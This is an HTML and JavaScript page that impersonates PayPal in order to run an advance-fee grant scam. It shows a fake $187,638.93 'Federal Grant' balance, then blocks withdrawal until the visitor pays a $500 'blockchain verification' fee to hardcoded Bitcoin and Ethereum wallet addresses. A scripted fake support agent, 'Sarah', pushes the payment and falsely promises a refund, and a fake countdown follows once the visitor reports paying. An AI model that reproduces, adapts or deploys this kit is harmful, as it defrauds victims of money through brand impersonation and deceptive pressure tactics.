<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal: The simpler, safer way to pay online</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; overflow-x: hidden; scroll-behavior: smooth; }
        .pp-blue { color: #0070ba; }
        .pp-bg-blue { background-color: #0070ba; }
        .hidden { display: none; }
        .animated-hero {
            background: linear-gradient(-45deg, #003087, #0070ba, #005ea6, #002c87);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
        }
        @keyframes gradient { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0070ba; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #chat-content::-webkit-scrollbar { width: 4px; }
        #chat-content::-webkit-scrollbar-thumb { background: #cbd5e0; border-radius: 10px; }
    </style>
</head>
<body class="bg-white">

    <div id="loading-screen" class="hidden fixed inset-0 bg-white z-[300] flex flex-col items-center justify-center text-center">
        <div class="loader mb-4"></div>
        <p id="loading-text" class="text-gray-500 font-medium px-6"></p>
    </div>

    <div id="chat-widget" class="fixed bottom-6 right-6 z-[250] hidden">
        <button onclick="toggleChat()" class="pp-bg-blue p-4 rounded-full shadow-2xl text-white relative">
            <span id="chat-notif" class="absolute top-0 right-0 w-4 h-4 bg-red-500 rounded-full border-2 border-white hidden"></span>
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"/></svg>
        </button>
    </div>

    <div id="chat-box" class="fixed bottom-24 right-6 w-80 bg-white shadow-2xl rounded-2xl border hidden z-[251] overflow-hidden">
        <div class="bg-[#002c87] p-4 text-white flex justify-between items-center">
            <div class="flex items-center space-x-2">
                <div class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                <span class="font-bold text-sm">Grant Support (Sarah)</span>
            </div>
            <button onclick="toggleChat()">✕</button>
        </div>
        <div id="chat-content" class="p-4 h-64 overflow-y-auto space-y-4 text-[13px] bg-gray-50">
            <div class="bg-white p-3 rounded-lg border shadow-sm self-start mr-8">
                Hello! I am Sarah, your dedicated agent for the Federal Grant transfer. How can I assist you with your activation today?
            </div>
        </div>
        <div class="p-3 border-t bg-white flex space-x-2">
            <input id="chat-input" type="text" placeholder="Type a message..." class="flex-1 outline-none text-sm p-1">
            <button onclick="userSendMessage()" class="text-blue-600 font-bold">Send</button>
        </div>
    </div>

    <div id="sidebar" class="fixed inset-0 bg-black/50 z-[200] hidden">
        <div class="bg-[#002c87] w-[300px] h-full p-8 text-white">
            <div class="flex justify-between items-center mb-12">
                <span class="text-2xl italic font-bold">PayPal</span>
                <button onclick="toggleSidebar()">✕</button>
            </div>
            <nav class="space-y-8 text-lg font-light">
                <button onclick="showPage('contact-page')" class="block">Contact Us</button>
                <button onclick="showPage('security-page')" class="block">Security Center</button>
                <button onclick="showPage('help-page')" class="block">Help Center</button>
                <div class="border-t border-blue-800 pt-8 mt-8">
                    <button onclick="location.reload()" class="font-bold uppercase tracking-widest text-xs">Logout</button>
                </div>
            </nav>
        </div>
    </div>

    <div id="landing-page">
        <nav class="sticky top-0 bg-white z-50 flex items-center justify-between px-6 py-4 border-b">
            <div class="flex items-center space-x-4">
                <button onclick="toggleSidebar()"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg></button>
                <span class="text-2xl font-bold pp-blue italic">PayPal</span>
            </div>
            <button onclick="showPage('login-page')" class="px-5 py-1.5 border border-blue-900 pp-blue rounded-full font-bold text-sm">Log In</button>
        </nav>
        <section class="animated-hero h-[600px] flex items-center justify-center text-center px-6 text-white">
            <div class="max-w-3xl">
                <h1 class="text-5xl md:text-7xl font-light mb-8">Move your money with confidence.</h1>
                <button onclick="showPage('signup-page')" class="px-14 py-4 bg-white text-blue-900 rounded-full font-bold text-xl shadow-2xl">Sign Up Free</button>
            </div>
        </section>
    </div>

    <div id="dashboard" class="hidden min-h-screen bg-gray-50">
        <nav class="bg-[#002c87] px-6 py-4 flex justify-between items-center text-white">
            <button onclick="toggleSidebar()"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg></button>
            <span class="text-xl font-bold italic">PayPal</span>
            <div class="w-8 h-8 bg-blue-900 rounded-full border border-white/50"></div>
        </nav>
        <div class="p-6 max-w-md mx-auto">
            <div class="flex justify-between items-center mb-6">
                <h2 class="text-2xl font-light">Hello, <span id="display-name" class="font-bold"></span></h2>
                <span class="text-[10px] bg-blue-100 text-blue-700 px-2 py-1 rounded font-bold">VERIFIED USER</span>
            </div>
            <div class="bg-white p-8 rounded-3xl border mb-6 text-center shadow-sm">
                <p class="text-gray-400 text-xs font-bold uppercase mb-2">Total Balance</p>
                <h3 class="text-4xl font-bold text-blue-900 mb-6">$187,638.93</h3>
                <button onclick="showPage('amount-page')" class="w-full py-4 pp-bg-blue text-white rounded-full font-bold">Transfer Money</button>
            </div>
            <div class="bg-white p-6 rounded-2xl border">
                <p class="font-bold mb-6">Transactions</p>
                <div id="activity-list" class="space-y-6">
                    <div class="flex justify-between">
                        <div><p class="text-sm font-bold">Federal Grant Fund</p><p class="text-[10px] text-gray-400">Received • Jan 5, 2026</p></div>
                        <p class="text-green-600 font-bold">+$187,638.93</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="amount-page" class="hidden min-h-screen p-8 bg-white text-center">
        <div class="max-w-md mx-auto">
            <button onclick="showPage('dashboard')" class="text-left block mb-12 text-gray-400">✕</button>
            <h2 class="text-xl font-bold mb-10">Enter amount to send</h2>
            <div class="flex items-center justify-center mb-4">
                <span class="text-4xl text-gray-300">$</span>
                <input type="number" id="send-val" value="500.00" class="text-6xl font-light outline-none w-52 text-center">
            </div>
            <button class="bg-gray-100 px-6 py-1 rounded-full text-xs font-bold mb-16">USD ▼</button>
            <button onclick="showPage('transfer-page')" class="w-full py-5 pp-bg-blue text-white rounded-full font-bold text-xl">Continue</button>
        </div>
    </div>

    <div id="transfer-page" class="hidden min-h-screen p-8 bg-white">
        <div class="max-w-md mx-auto">
            <button onclick="showPage('amount-page')" class="mb-8 font-bold text-blue-600 flex items-center">← Back</button>
            <h2 class="text-3xl font-bold mb-12">Who are you sending to?</h2>
            <input id="recipient-email" type="email" placeholder="Email, phone, or name" class="w-full border-b-2 py-4 text-xl outline-none focus:border-blue-500">
            <button onclick="validateRecipient()" class="w-full mt-12 py-5 pp-bg-blue text-white rounded-full font-bold text-xl">Review</button>
        </div>
    </div>

    <div id="verify-page" class="hidden min-h-screen p-8 flex flex-col items-center justify-center text-center">
        <div class="w-20 h-20 bg-orange-100 rounded-full flex items-center justify-center mb-6 text-orange-500 text-3xl font-bold">!</div>
        <h2 class="text-2xl font-bold mb-4">Portal Locked</h2>
        <p class="text-gray-500 text-sm mb-10 px-4 leading-relaxed">High-limit transfers from the <b>U.S. Grant Organisation</b> require a one-time blockchain verification of <b>$500.00</b> to authenticate your wallet linkage.</p>
        <button onclick="showPage('payment-methods')" class="w-full py-4 pp-bg-blue text-white rounded-full font-bold text-lg max-w-xs">Start Verification</button>
    </div>

    <div id="wallet-page" class="hidden min-h-screen p-8 text-center bg-white">
        <div class="max-w-md mx-auto">
            <h2 class="text-2xl font-bold mb-10">Send $500.00</h2>
            <div class="p-4 border-2 border-gray-100 rounded-3xl mb-8 inline-block shadow-sm">
                <img id="qr-code" src="" class="w-52 h-52">
            </div>
            <div class="bg-gray-50 p-4 border rounded-xl flex items-center mb-10">
                <span id="wallet-addr" class="text-[10px] font-mono break-all flex-1 text-left font-bold text-gray-600"></span>
                <button onclick="copyAddr()" class="ml-4 text-blue-600 font-bold">COPY</button>
            </div>
            <button onclick="confirmPayment()" class="w-full py-5 bg-green-600 text-white rounded-full font-bold text-xl">I HAVE PAID</button>
        </div>
    </div>

    <div id="success-page" class="hidden min-h-screen flex flex-col items-center justify-center p-8 text-center bg-white">
        <div class="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mb-8 text-green-600 font-bold text-3xl">✓</div>
        <h2 class="text-3xl font-bold mb-4">Under Review</h2>
        <p class="text-gray-500 mb-8">The blockchain is confirming your $500.00 deposit.</p>
        <div class="bg-blue-50 px-6 py-2 rounded-full text-blue-600 font-bold text-sm mb-12">Portal unlocks in: <span id="timer">05:00</span></div>
        <button onclick="showPage('dashboard')" class="w-full py-4 border rounded-full font-bold text-gray-400 max-w-sm">Summary</button>
    </div>

    <div id="login-page" class="hidden min-h-screen p-8 flex flex-col items-center"><span class="text-4xl font-bold mb-16 pp-blue italic">PayPal</span><input id="login-email" type="text" placeholder="Email" class="w-full max-w-sm border p-4 mb-4 rounded-md"><button onclick="handleLogin()" class="w-full max-w-sm py-4 pp-bg-blue text-white rounded-full font-bold">Log In</button></div>
    <div id="signup-page" class="hidden min-h-screen p-8 flex flex-col items-center"><span class="text-2xl font-bold pp-blue italic mb-10">PayPal</span><input id="reg-name" type="text" placeholder="Full Name" class="w-full max-w-sm border p-4 mb-4 rounded-md"><button onclick="handleSignup()" class="w-full max-w-sm py-4 bg-black text-white rounded-full font-bold">Continue</button></div>

    <script>
        let isLoggedIn = false;
        let chatInitialized = false;

        function showPage(id) {
            document.querySelectorAll('body > div:not(#loading-screen):not(#sidebar):not(#chat-widget):not(#chat-box)').forEach(d => d.classList.add('hidden'));
            document.getElementById(id).classList.remove('hidden');
            document.getElementById('sidebar').classList.add('hidden');
            
            // Show Chat Widget only on specific flow pages
            const chatPages = ['amount-page', 'transfer-page', 'verify-page', 'wallet-page'];
            if(chatPages.includes(id)) {
                document.getElementById('chat-widget').classList.remove('hidden');
                if(!chatInitialized && id === 'wallet-page') {
                    setTimeout(() => {
                        document.getElementById('chat-notif').classList.remove('hidden');
                        agentMessage("Hi! I'm here to help you complete the verification. Do you need the address again?");
                    }, 8000);
                    chatInitialized = true;
                }
            } else {
                document.getElementById('chat-widget').classList.add('hidden');
                document.getElementById('chat-box').classList.add('hidden');
            }
            window.scrollTo(0,0);
        }

        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('hidden'); }
        function toggleChat() { 
            document.getElementById('chat-box').classList.toggle('hidden'); 
            document.getElementById('chat-notif').classList.add('hidden');
        }

        function userSendMessage() {
            const input = document.getElementById('chat-input');
            const val = input.value.trim();
            if(!val) return;
            const content = document.getElementById('chat-content');
            content.innerHTML += `<div class="bg-blue-100 p-3 rounded-lg border shadow-sm self-end ml-8 text-right">${val}</div>`;
            input.value = '';
            content.scrollTop = content.scrollHeight;

            // Agent Response logic
            setTimeout(() => {
                const typing = `<div id="typing" class="text-[10px] text-gray-400 italic">Sarah is typing...</div>`;
                content.innerHTML += typing;
                content.scrollTop = content.scrollHeight;
                
                setTimeout(() => {
                    document.getElementById('typing').remove();
                    let response = "I understand. To ensure the $187,638.93 grant is released to your bank, the $500.00 network fee must be confirmed. It is fully refundable once your portal activates.";
                    if(val.toLowerCase().includes('help')) response = "I am here! Just copy the address on your screen and send exactly $500.00 from your crypto wallet.";
                    agentMessage(response);
                }, 2000);
            }, 500);
        }

        function agentMessage(text) {
            const content = document.getElementById('chat-content');
            content.innerHTML += `<div class="bg-white p-3 rounded-lg border shadow-sm self-start mr-8">${text}</div>`;
            content.scrollTop = content.scrollHeight;
            if(document.getElementById('chat-box').classList.contains('hidden')) {
                document.getElementById('chat-notif').classList.remove('hidden');
            }
        }

        function handleLogin() { 
            document.getElementById('display-name').innerText = "Gemini";
            showLoading('Connecting to Global Servers...', 'dashboard'); 
        }

        function handleSignup() { 
            const name = document.getElementById('reg-name').value || 'User';
            document.getElementById('display-name').innerText = name;
            showLoading('Generating Grant Ledger...', 'dashboard'); 
        }

        function validateRecipient() { showLoading('Verifying Recipient...', 'verify-page'); }

        function showWallet(type) {
            const addr = type === 'BTC' ? 'bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7' : '0x08cfe6ddc3b58b0655dd1c9214bcfddbd3855cca';
            document.getElementById('wallet-addr').innerText = addr;
            document.getElementById('qr-code').src = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${addr}`;
            showPage('wallet-page');
        }

        function confirmPayment() {
            const txId = 'PX-' + Math.floor(Math.random() * 9999999);
            const entry = `<div class="flex justify-between border-b pb-4 mb-4"><div class="flex items-center space-x-2"><div class="w-8 h-8 bg-orange-50 rounded-full flex items-center justify-center text-orange-600 text-[10px] font-bold">!</div><div><p class="text-xs font-bold">Activation Fee [Pending]</p><p class="text-[9px] text-gray-400">ID: ${txId}</p></div></div><p class="text-gray-400 font-bold text-sm">-$500.00</p></div>`;
            document.getElementById('activity-list').insertAdjacentHTML('afterbegin', entry);
            startTimer();
            showLoading('Broadcasting to Blockchain (20s)...', null);
            setTimeout(() => {
                document.getElementById('loading-screen').classList.add('hidden');
                showPage('success-page');
            }, 20000);
        }

        function startTimer() {
            let sec = 300;
            const timer = setInterval(() => {
                let m = Math.floor(sec/60); let s = sec % 60;
                document.getElementById('timer').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
                if (sec <= 0) clearInterval(timer); sec--;
            }, 1000);
        }

        function copyAddr() { alert('Address Copied!'); }

        function showLoading(text, nextId) {
            const screen = document.getElementById('loading-screen');
            document.getElementById('loading-text').innerText = text;
            screen.classList.remove('hidden');
            if(nextId) setTimeout(() => { screen.classList.add('hidden'); showPage(nextId); }, 2000);
        }

        // Default: Show landing
        showPage('landing-page');
        showWallet('BTC'); // Pre-load BTC address
    </script>
</body>
</html>
